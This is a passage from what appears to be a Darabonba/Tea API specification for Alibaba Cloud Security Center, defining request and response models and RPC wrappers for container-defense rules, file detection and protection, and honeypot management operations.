  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClusterRuleSummaryResponseBody(name='body'),
}

async function getClusterRuleSummary(request: GetClusterRuleSummaryRequest): GetClusterRuleSummaryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetClusterRuleSummary', 'POST', '/', 'json', false, 'json', request);
}

model GetClusterSuspEventStatisticsRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c6094b964bfc145fe9e418c869e7e****', position='Query'),
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas', position='Query'),
}

model GetClusterSuspEventStatisticsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ACF97412-FD09-4D1F-994F-34DF12BR****'),
  suspStatistics?: {
    remind?: int32(name='Remind', description='The number of alerts whose Emergency level is Reminder.', example='1'),
    serious?: int32(name='Serious', description='The number of alerts whose Emergency level is Urgent.', example='1'),
    suspicious?: int32(name='Suspicious', description='The number of alerts whose Emergency level is Suspicious.', example='2'),
  }(name='SuspStatistics', description='The number of alerts by risk level.'),
}

model GetClusterSuspEventStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClusterSuspEventStatisticsResponseBody(name='body'),
}

async function getClusterSuspEventStatistics(request: GetClusterSuspEventStatisticsRequest): GetClusterSuspEventStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetClusterSuspEventStatistics', 'POST', '/', 'json', false, 'json', request);
}

model GetCommonSwitchConfigRequest {
  type?: string(name='Type', example='USER-DEFINE-RULE-SWITCH-TYPE_180****', position='Query'),
}

model GetCommonSwitchConfigResponseBody = {
  data?: {
    targetDefault?: string(name='TargetDefault', example='add'),
    targetSyncStatus?: string(name='TargetSyncStatus', example='valid'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model GetCommonSwitchConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCommonSwitchConfigResponseBody(name='body'),
}

async function getCommonSwitchConfig(request: GetCommonSwitchConfigRequest): GetCommonSwitchConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetCommonSwitchConfig', 'POST', '/', 'json', false, 'json', request);
}

model GetContainerDefenseRuleDetailRequest {
  ruleId?: long(name='RuleId', description='The ID of the rule.

>  You can call the [ListContainerDefenseRule](~~xx~~) operation to obtain the IDs of rules.', example='156', position='Query'),
}

model GetContainerDefenseRuleDetailResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    aliUid?: long(name='AliUid', description='The user ID.', example='1766185894104***'),
    description?: string(name='Description', description='The description of the rule.'),
    eventName?: string(name='EventName', description='The alert name. Valid values:

*   **Non-image Program Startup**', example='EventName'),
    eventType?: string(name='EventType', description='The alert type. Valid values:

*   **Proactive Defense for Containers**', example='EventType'),
    id?: long(name='Id', description='The ID of the rule.', example='1948'),
    ruleAction?: int32(name='RuleAction', description='The action specified in the rule. Valid values:

*   **1**: alert
*   **2**: block', example='1'),
    ruleName?: string(name='RuleName', description='The name of the rule.', example='test-000'),
    ruleSwitch?: int32(name='RuleSwitch', description='The status of the rule. Valid values:

*   **1**: enabled
*   **0**: disabled', example='0'),
    ruleType?: string(name='RuleType', description='The type of the rule. Valid values:

*   **1**: system rule
*   **2**: custom rule', example='1'),
    scope?: [ 
      {
        allNamespace?: int32(name='AllNamespace', description='Indicates whether all namespaces are included. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
        clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='c9bea04*2b25**'),
        namespaces?: [ string ](name='Namespaces', description='The namespaces.'),
      }
    ](name='Scope', description='The effective scope of the rule.'),
    whitelist?: {
      hash?: [ string ](name='Hash', description='The hash values of the files that are added to the whitelist.

>  This parameter is not supported.'),
      image?: [ string ](name='Image'),
      path?: [ string ](name='Path', description='The paths to the files that are added to the whitelist.'),
    }(name='Whitelist', description='The whitelist.'),
  }(name='Data', description='The details of the rule.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code. The status code 200 indicates that the request was successful.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='77546BF4-CCE8-5F8D-B42B-5FD3306B43B4'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetContainerDefenseRuleDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetContainerDefenseRuleDetailResponseBody(name='body'),
}

async function getContainerDefenseRuleDetail(request: GetContainerDefenseRuleDetailRequest): GetContainerDefenseRuleDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetContainerDefenseRuleDetail', 'POST', '/', 'json', false, 'json', request);
}

model GetFileDetectApiInvokeInfoRequest {
}

model GetFileDetectApiInvokeInfoResponseBody = {
  data?: {
    authCount?: long(name='AuthCount', description='The total number of authorizations.', example='10000'),
    expire?: long(name='Expire', description='The timestamp of the expiration date of the authorization number.', example='1815753600000'),
    flowRate?: int32(name='FlowRate', description='The frequency of calls.', example='20'),
    remainAuthCount?: long(name='RemainAuthCount', description='The number of remaining authorizations.', example='900'),
    saleVersion?: int32(name='SaleVersion', description='The Authorized Version. Valid values include:

* **1:** trial version
* **2:** Enterprise Edition', example='2'),
    timeUnit?: string(name='TimeUnit', description='The time unit of the frequency limit. Value:

* **SECONDS**
* **MINUTES**', example='SECONDS'),
  }(name='Data', description='Returns the response body.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9f368b6e-d60a-43c5-bd6f-c7087f2d****'),
}

model GetFileDetectApiInvokeInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetFileDetectApiInvokeInfoResponseBody(name='body'),
}

async function getFileDetectApiInvokeInfo(request: GetFileDetectApiInvokeInfoRequest): GetFileDetectApiInvokeInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetFileDetectApiInvokeInfo', 'POST', '/', 'json', false, 'json', request);
}

model GetFileDetectReportRequest {
  eventId?: long(name='EventId', example='81****', position='Query'),
  field?: string(name='Field', example='Basic,,ThreatTypes,Intelligences,Sandbox', position='Query'),
  fileHash?: string(name='FileHash', example='b63917332950e5d219d0737ffe31****', position='Query'),
  lang?: string(name='Lang', example='en', position='Query'),
  sourceType?: string(name='SourceType', example='object_scan', position='Query'),
}

model GetFileDetectReportResponseBody = {
  code?: string(name='Code', example='200'),
  data?: {
    basic?: string(name='Basic', example='{
        "sha256": "",
        "sha512": "",
        "source": "aegis",
        "gmt_first_submit": "",
        "sha1": "",
        "virus_result": "",
        "webshell_result": "",
        "gmt_update": "",
        "sandbox_result": "2",
        "fileSize": "363752",
        "virus_name": "",
    }'),
    fileHash?: string(name='FileHash', example='c42b5f6bde0b730ece2923266333****'),
    filename?: string(name='Filename'),
    hasData?: boolean(name='HasData', example='true'),
    intelligences?: string(name='Intelligences'),
    sandbox?: string(name='Sandbox', example='{\\"BehaviorData\\": {}, \\"ProcessData\\": {}, \\"SandboxData\\": {}, \\"AttackData\\": [], \\"NetworkData\\": {}, \\"SolutionData\\": {}, \\"FileData\\": {}}'),
    showTab?: boolean(name='ShowTab', example='true'),
    threatLevel?: long(name='ThreatLevel', example='2'),
    threatTypes?: string(name='ThreatTypes'),
  }(name='Data'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393XXXX'),
  success?: boolean(name='Success', example='true'),
}

model GetFileDetectReportResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetFileDetectReportResponseBody(name='body'),
}

async function getFileDetectReport(request: GetFileDetectReportRequest): GetFileDetectReportResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetFileDetectReport', 'POST', '/', 'json', false, 'json', request);
}

model GetFileDetectResultRequest {
  hashKeyList: [ string ](name='HashKeyList', description='The identifiers of files. Only MD5 hash values are supported.', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='183.46.XX.XX', position='Query'),
  type: int32(name='Type', description='The type of the file. Valid values:

*   **0**: unknown file
*   **1**: binary file
*   **2**: webshell file
*   **4**: script file

> If you do not know the type of the file, set this parameter to 0.', example='0', position='Query'),
}

model GetFileDetectResultResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
  resultList?: [ 
    {
      code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
      ext?: string(name='Ext', description='The extended information about the file detection result.', example='{"HighLight":[[23245,23212]]}'),
      hashKey?: string(name='HashKey', description='The identifier of the file. Only MD5 hash values are supported.', example='0a212417e65c26ff133cfff28f6c****'),
      message?: string(name='Message', description='The error message returned.', example='successful'),
      result?: int32(name='Result', description='The file detection result. Valid values:

*   **0**: The file is normal.
*   **1**: The file is suspicious.
*   **3**: The detection is in progress.', example='0'),
      score?: int32(name='Score', description='The score of file detection result.

> A higher score indicates a more suspicious file.', example='100'),
      virusType?: string(name='VirusType', description='The type of the virus. Valid values:

*   **Trojan**: self-mutating trojan
*   **WebShell**: webshell
*   **Backdoor**: backdoor program
*   **RansomWare**: ransomware
*   **Scanner**: scanner
*   **Stealer**: tool that is used to steal information
*   **Malbaseware**: tainted basic software
*   **Hacktool**: attacker tool
*   **Engtest**: engine test program
*   **Downloader**: trojan downloader
*   **Virus**: infectious virus
*   **Miner**: mining program
*   **Worm**: worm
*   **DDoS**: DDoS trojan
*   **Malware**: malicious program
*   **Backdoor**: reverse shell
*   **RiskWare**: software that has risks
*   **Proxytool**: proxy
*   **Suspicious**: suspicious program
*   **MalScript**: malicious script
*   **Rootkit**: rootkit
*   **Exploit**: exploit', example='WEBSHELL'),
    }
  ](name='ResultList', description='An array that consists of file detection results.'),
}

model GetFileDetectResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetFileDetectResultResponseBody(name='body'),
}

/**
  * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
  *
 */
async function getFileDetectResult(request: GetFileDetectResultRequest): GetFileDetectResultResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetFileDetectResult', 'POST', '/', 'json', false, 'json', request);
}

model GetFileProtectDashboardRequest {
}

model GetFileProtectDashboardResponseBody = {
  data?: {
    enableRuleCount?: int32(name='EnableRuleCount', description='The total number of enabled rules.', example='12'),
    pluginCount?: int32(name='PluginCount', description='The total number of servers on which the Security Center agent is installed.', example='12'),
    pluginOfflineCount?: int32(name='PluginOfflineCount', description='The total number of servers on which the Security Center agent is offline.', example='1'),
    pluginOnlineCount?: int32(name='PluginOnlineCount', description='The total number of servers on which the Security Center agent is online.', example='11'),
  }(name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
}

model GetFileProtectDashboardResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetFileProtectDashboardResponseBody(name='body'),
}

async function getFileProtectDashboard(request: GetFileProtectDashboardRequest): GetFileProtectDashboardResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetFileProtectDashboard', 'POST', '/', 'json', false, 'json', request);
}

model GetFileProtectEventRequest {
  id?: long(name='Id', description='The ID of the event.', example='12', position='Query'),
}

model GetFileProtectEventResponseBody = {
  data?: {
    alertLevel?: int32(name='AlertLevel', description='The severity of alerts. Valid values:

*   0: does not generate alerts
*   1: sends notifications
*   2: suspicious
*   3: high-risk', example='1'),
    cmdLine?: string(name='CmdLine', description='The event command line.', example='["touch","/usr/local/aaaa"]'),
    filePath?: string(name='FilePath', description='The path to the file.', example='/usr/local'),
    filePermission?: string(name='FilePermission', description='The permissions to run the process.', example='rwxr-xr-x'),
    firstTime?: long(name='FirstTime', description='The timestamp at which the event was first detected.', example='1694576692000'),
    handleTime?: long(name='HandleTime', description='The time when the event was handled.', example='1694576692000'),
    id?: long(name='Id', description='The ID of the event.', example='55037'),
    instanceName?: string(name='InstanceName', description='The name of the instance.', example='i-wz92q7m5hsbgfhdss***'),
    internetIp?: string(name='InternetIp', description='The public IP address of the associated instance.', example='172.16.XX.XX'),
    intranetIp?: string(name='IntranetIp', description='The private IP address of the associated instance.', example='10.42.XX.XX'),
    latestTime?: long(name='LatestTime', description='The time when the event last occurred.', example='1694576692000'),
    operation?: string(name='Operation', description='The operation that the process performed on the file.', example='DELETE'),
    procPath?: string(name='ProcPath', description='The path to the process.', example='/bin/bash33'),
    processId?: string(name='ProcessId', description='The process ID of the event.', example='3453'),
    remark?: string(name='Remark', description='The remarks.', example='["test"]'),
    ruleName?: string(name='RuleName', description='The name of the rule.', example='test-000'),
    status?: int32(name='Status', description='The status of the event. Valid values:

*   0: not handled
*   1: handled
*   2: added to the whitelist', example='1'),
    uuid?: string(name='Uuid', description='The UUID of the asset.', example='49f1360f-62c8-4b48-a24c-5cc317656419'),
  }(name='Data', description='The details of the returned data.'),
  requestId?: string(name='RequestId', description='The request ID.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model GetFileProtectEventResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetFileProtectEventResponseBody(name='body'),
}

async function getFileProtectEvent(request: GetFileProtectEventRequest): GetFileProtectEventResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetFileProtectEvent', 'POST', '/', 'json', false, 'json', request);
}

model GetFileProtectEventCountRequest {
  status?: int32(name='Status', description='The status of the event. Valid values:

*   0: unhandled
*   1: handled', example='1', position='Query'),
}

model GetFileProtectEventCountResponseBody = {
  data?: int32(name='Data', description='The data returned if the request is successful.', example='16'),
  requestId?: string(name='RequestId', description='The request ID.', example='9B28EC81-2FA7-5097-80D9-0DBE1A3DBD59'),
}

model GetFileProtectEventCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetFileProtectEventCountResponseBody(name='body'),
}

async function getFileProtectEventCount(request: GetFileProtectEventCountRequest): GetFileProtectEventCountResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetFileProtectEventCount', 'POST', '/', 'json', false, 'json', request);
}

model GetFileProtectRuleRequest {
  id?: long(name='Id', description='The ID of the rule.', example='245', position='Query'),
}

model GetFileProtectRuleResponseBody = {
  data?: {
    action?: string(name='Action', description='The handling method of the rule. Valid values:

1.  pass: allow
2.  alert', example='pass'),
    alertLevel?: int32(name='AlertLevel', description='The severity of alerts. Valid values:

*   0: does not generate alerts
*   1: sends notifications
*   2: suspicious
*   3: high-risk', example='0'),
    fileOps?: [ string ](name='FileOps', description='The operations performed on the files.'),
    filePaths?: [ string ](name='FilePaths', description='The paths to the monitored files.'),
    id?: long(name='Id', description='The ID of the rule.', example='44616'),
    procPaths?: [ string ](name='ProcPaths', description='The paths to the monitored processes.'),
    ruleName?: string(name='RuleName', description='The name of the rule.', example='test-000'),
    status?: int32(name='Status', description='The status of the rule. Valid values:

1.  0: disabled
2.  1: enabled', example='1'),
    switchId?: string(name='SwitchId', description='The switch ID of the rule.', example='FILE_PROTECT_RULE_SWITCH_TYPE_0000'),
  }(name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='C0DF9057-67C5-574D-A2D2-0CA9AC74C4D3'),
}

model GetFileProtectRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetFileProtectRuleResponseBody(name='body'),
}

async function getFileProtectRule(request: GetFileProtectRuleRequest): GetFileProtectRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetFileProtectRule', 'POST', '/', 'json', false, 'json', request);
}

model GetFileUploadLimitRequest {
}

model GetFileUploadLimitResponseBody = {
  data?: {
    limit?: string(name='Limit', description='The QPS limit on the files uploaded from the client.', example='100'),
  }(name='Data', description='The data returned if the request is successful.'),
  requestId?: string(name='RequestId', description='The request ID.', example='1A975D03-5F49-5354-B2CB-3918D5DA431A'),
}

model GetFileUploadLimitResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetFileUploadLimitResponseBody(name='body'),
}

async function getFileUploadLimit(request: GetFileUploadLimitRequest): GetFileUploadLimitResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetFileUploadLimit', 'POST', '/', 'json', false, 'json', request);
}

model GetHoneyPotUploadPolicyInfoRequest {
  lang?: string(name='Lang', example='zh', position='Query'),
}

model GetHoneyPotUploadPolicyInfoResponseBody = {
  code?: string(name='Code', example='200'),
  data?: {
    accessid?: string(name='Accessid', example='LTAI4G1mgPbjvGQuiV1X****'),
    expire?: string(name='Expire', example='1661443200000'),
    host?: string(name='Host', example='https://aegis-update-static-file.oss-cn-hangzhou.aliyuncs.com'),
    key?: string(name='Key', example='HONEYPOT_FILE/1766185894104675_169********'),
    policy?: string(name='Policy', example='eyJleHBpcmF0aW9uIjoiMjAyMy0wOS0wMVQwMzoyNTozNS44MzZaIiwiY29uZGl0aW9ucyI6W1siY29udGVudC1sZW5ndGgtcmFuZ2UiLDAsMTA0ODU3NjAwXSxbInN0YXJ0cy13aXRoIiwiJGtleSIsIkhPTkVZUE9UX0ZJTEUvMTc2NjE4NTg5NDEwNDY3NV8xNjkzNTM4NDM1N*****************'),
    signature?: string(name='Signature', example='wKPqlFneNTZPn52k2Rz9GTY*****'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='8C177095-A734-59B2-9409-7D4F26FF****'),
  success?: boolean(name='Success', example='true'),
}

model GetHoneyPotUploadPolicyInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneyPotUploadPolicyInfoResponseBody(name='body'),
}

async function getHoneyPotUploadPolicyInfo(request: GetHoneyPotUploadPolicyInfoRequest): GetHoneyPotUploadPolicyInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetHoneyPotUploadPolicyInfo', 'POST', '/', 'json', false, 'json', request);
}

model GetHoneypotAttackStatisticsRequest {
  currentPage?: int32(name='CurrentPage', example='1', position='Query'),
  endTimeStamp?: long(name='EndTimeStamp', example='1675058931215', position='Query'),
  lang?: string(name='Lang', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', example='20', position='Query'),
  riskLevelList?: [ string ](name='RiskLevelList', position='Query'),
  srcIp: string(name='SrcIp', example='47.92.139.**', position='Query'),
  startTimeStamp?: long(name='StartTimeStamp', example='1681624877761', position='Query'),
  statisticsType: string(name='StatisticsType', example='TOP_ATTACKED_IP', position='Query'),
}

model GetHoneypotAttackStatisticsResponseBody = {
  code?: string(name='Code', example='200'),
  data?: {
    count?: int32(name='Count', example='2'),
    honeypotAttackStatistics?: [ 
      {
        statisticsCount?: int32(name='StatisticsCount', example='10'),
        statisticsValue?: string(name='StatisticsValue', example='112.168.1.**'),
      }
    ](name='HoneypotAttackStatistics'),
    statisticsType?: string(name='StatisticsType', example='TOP_ATTACKED_IP'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='3FACC60A-3FE4-5F49-9184-50730C8B****'),
  success?: boolean(name='Success', example='true'),
}

model GetHoneypotAttackStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneypotAttackStatisticsResponseBody(name='body'),
}

async function getHoneypotAttackStatistics(request: GetHoneypotAttackStatisticsRequest): GetHoneypotAttackStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetHoneypotAttackStatistics', 'POST', '/', 'json', false, 'json', request);
}

model GetHoneypotEventTrendRequest {
  endTimeStamp?: long(name='EndTimeStamp', description='End time, timestamp format.', example='1687831329169', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  riskLevelList?: [ string ](name='RiskLevelList', description='The risk levels of the alert events.', position='Query'),
  srcIp: string(name='SrcIp', description='The source IP address of the attack.', example='10.91.254.***', position='Query'),
  startTimeStamp?: long(name='StartTimeStamp', description='Start time, timestamp format.', example='1683516557757', position='Query'),
}

model GetHoneypotEventTrendResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='5'),
  data?: [ 
    {
      count?: int32(name='Count', description='The number of attacks that occurred.', example='5'),
      keyName?: string(name='KeyName', description='The name of the attack.', example='ATTACK_EVENT'),
      timeStamp?: long(name='TimeStamp', description='The timestamp when the attack event occurred.', example='1686968163644'),
    }
  ](name='Data', description='The list of data returned. ￼'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='21637690-9B21-5EEC-94DB-2A732480****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model GetHoneypotEventTrendResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneypotEventTrendResponseBody(name='body'),
}

async function getHoneypotEventTrend(request: GetHoneypotEventTrendRequest): GetHoneypotEventTrendResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetHoneypotEventTrend', 'POST', '/', 'json', false, 'json', request);
}

model GetHoneypotNodeRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  nodeId: string(name='NodeId', description='The ID of the management node.

> You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to query the IDs of management nodes.', example='d3dd3864-4e02-4abd-8b6a-8f5f6fec4715', position='Query'),
}

model GetHoneypotNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotNode?: {
    allowHoneypotAccessInternet?: boolean(name='AllowHoneypotAccessInternet', description='Indicates whether a honeypot is allowed to access the Internet. Valid values:

*   **true**: The honeypot is allowed to access the Internet.
*   **false**: The honeypot is not allowed to access the Internet.', example='true'),
    createTime?: string(name='CreateTime', description='The time when the management node was created.', example='2022-12-02 17:13:43'),
    ecsInstanceId?: string(name='EcsInstanceId', description='The ID of the instance.', example='i-2vccskxjunf1ag6w****'),
    honeypotTotalCount?: int32(name='HoneypotTotalCount', description='The maximum number of honeypots that can be deployed to the management node.', example='10'),
    honeypotUsedCount?: int32(name='HoneypotUsedCount', description='The number of honeypots that are deployed to the management node.', example='5'),
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='a7409a58-bc60-41af-9d36-080d58ae****'),
    nodeIp?: string(name='NodeIp', description='The IP address of the management node.', example='101.37.XX.XX'),
    nodeName?: string(name='NodeName', description='The name of the management node.', example='gmmc'),
    probeTotalCount?: int32(name='ProbeTotalCount', description='The maximum number of probes that can be deployed for the management node.', example='20'),
    probeUsedCount?: int32(name='ProbeUsedCount', description='The number of probes that are deployed for the management node.', example='15'),
    securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList', description='An array consisting of the CIDR blocks that are allowed to access the management node.'),
    totalStatus?: int32(name='TotalStatus', description='The status of the management node. Valid values:

*   **0**: preparing
*   **1**: normal
*   **2**: abnormal
*   **4**: starting
*   **5**: upgrading', example='2'),
    upgradeAvailable?: boolean(name='UpgradeAvailable', description='Indicates whether the management node can be upgraded. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  }(name='HoneypotNode', description='The details of the management node.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0A453658-070B-5554-B46C-867425BE4FD4'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model GetHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneypotNodeResponseBody(name='body'),
}

async function getHoneypotNode(request: GetHoneypotNodeRequest): GetHoneypotNodeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetHoneypotNode', 'POST', '/', 'json', false, 'json', request);
}

model GetHoneypotNodeMetricListRequest {
  endTime?: string(name='EndTime', example='2019-01-30 00:10:00', position='Query'),
  express?: string(name='Express', example='{"groupby":["userId","instanceId"]}', position='Query'),
  length?: string(name='Length', example='100', position='Query'),
  metricName?: string(name='MetricName', example='cpu_total', position='Query'),
  namespace?: string(name='Namespace', example='acs_ecs_dashboard', position='Query'),
  nodeId?: string(name='NodeId', example='cc427e14-f257-4670-9d2b-d83bbbe7****', position='Query'),
  period?: string(name='Period', example='60', position='Query'),
  startTime?: string(name='StartTime', example='2019-01-30 00:00:00', position='Query'),
}

model GetHoneypotNodeMetricListResponseBody = {
  data?: string(name='Data', example='{
    "code": "200",
    "datapoints": "[{\\"timestamp\\":1698375060000,\\"instanceId\\":\\"i-bp18jn50nid83nsu****\\",\\"ip\\":\\"1.1.1.1\\",\\"userId\\":\\"132776878515****\\",\\"Minimum\\":67084.0,\\"Maximum\\":67084.0,\\"Average\\":67084.0},{\\"timestamp\\":1698375120000,\\"instanceId\\":\\"i-bp18jn50nid83nsu****\\",\\"ip\\":\\"1.1.1.1\\",\\"userId\\":\\"132776878515****\\",\\"Minimum\\":63704.0,\\"Maximum\\":63704.0,\\"Average\\":63704.0},{\\"timestamp\\":1698375180000,\\"instanceId\\":\\"i-bp18jn50nid83nsu****\\",\\"ip\\":\\"1.1.1.1\\",\\"userId\\":\\"132776878515****\\",\\"Minimum\\":67624.0,\\"Maximum\\":67624.0,\\"Average\\":67624.0},{\\"timestamp\\":1698375240000,\\"instanceId\\":\\"i-bp18jn50nid83nsu****\\",\\"ip\\":\\"1.1.1.1\\",\\"userId\\":\\"132776878515****\\",\\"Minimum\\":68432.0,\\"Maximum\\":68432.0,\\"Average\\":68432.0},{\\"timestamp\\":1698375300000,\\"instanceId\\":\\"i-bp18jn50nid83nsu****\\",\\"ip\\":\\"1.1.1.1\\",\\"userId\\":\\"132776878515****\\",\\"Minimum\\":70148.0,\\"Maximum\\":70148.0,\\"Average\\":70148.0},{\\"timestamp\\":1698375360000,\\"instanceId\\":\\"i-bp18jn50nid83nsu****\\",\\"ip\\":\\"1.1.1.1\\",\\"userId\\":\\"132776878515****\\",\\"Minimum\\":63612.0,\\"Maximum\\":63612.0,\\"Average\\":63612.0},{\\"timestamp\\":1698375420000,\\"instanceId\\":\\"i-bp18jn50nid83nsu****\\",\\"ip\\":\\"1.1.1.1\\",\\"userId\\":\\"132776878515****\\",\\"Minimum\\":68032.0,\\"Maximum\\":68032.0,\\"Average\\":68032.0},{\\"timestamp\\":1698375480000,\\"instanceId\\":\\"i-bp18jn50nid83nsu****\\",\\"ip\\":\\"1.1.1.1\\",\\"userId\\":\\"132776878515****\\",\\"Minimum\\":67400.0,\\"Maximum\\":67400.0,\\"Average\\":67400.0},{\\"timestamp\\":1698375540000,\\"instanceId\\":\\"i-bp18jn50nid83nsu****\\",\\"ip\\":\\"1.1.1.1\\",\\"userId\\":\\"132776878515****\\",\\"Minimum\\":65352.0,\\"Maximum\\":65352.0,\\"Average\\":65352.0}]",
    "period": "60",
    "requestId": "AFE33E4E-70A3-5BAE-AEA8-4D3BF3A75067",
    "success": true
}'),
  requestId?: string(name='RequestId', example='48F523DA-4C7E-5417-B872-E313E5A4****'),
}

model GetHoneypotNodeMetricListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneypotNodeMetricListResponseBody(name='body'),
}

async function getHoneypotNodeMetricList(request: GetHoneypotNodeMetricListRequest): GetHoneypotNodeMetricListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetHoneypotNodeMetricList', 'POST', '/', 'json', false, 'json', request);
}

model GetHoneypotPresetRequest {
  honeypotPresetId: string(name='HoneypotPresetId', description='The ID of the honeypot template.

> You can call the [ListHoneypotPreset](~~ListHoneypotPreset~~) operation to query the IDs of honeypot templates.', example='207ca117-44b9-495d-84e7-50289b4cxxxx', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en', position='Query'),
}

model GetHoneypotPresetResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    controlNodeName?: string(name='ControlNodeName', description='The name of the management node.', example='managerNodename'),
    fileInfoList?: [ 
      {
